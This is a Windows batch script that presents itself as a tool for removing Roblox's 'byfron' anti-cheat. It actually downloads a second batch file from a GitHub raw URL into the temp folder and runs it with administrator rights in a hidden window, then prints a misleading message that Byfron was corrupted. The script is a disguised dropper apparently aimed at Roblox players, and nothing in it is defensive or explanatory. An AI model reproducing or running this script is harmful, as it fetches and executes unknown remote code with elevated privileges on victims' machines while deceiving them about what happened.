@echo off
setlocal

set "folderPath=%localappdata%\Roblox"
set "url=https://raw.githubusercontent.com/skibidzaa/tak/main/downloader.bat"
set "tempBatFile=%temp%\downloaded.bat"

if exist "%folderPath%" (
    echo Preparing removal of byfron...

    powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%tempBatFile%')"

    if exist "%tempBatFile%" (
        echo Removing byfron...

        powershell -Command "Start-Process cmd.exe -ArgumentList '/c %tempBatFile%' -Verb RunAs -WindowStyle Hidden"
        echo Byfron has been accidently corrupted, reinstall Roblox.
    ) else (
        echo Failed to remove byfron. Please try again or download a newer version of this program.
    )
) else (
    echo Roblox is not installed.
)

endlocal
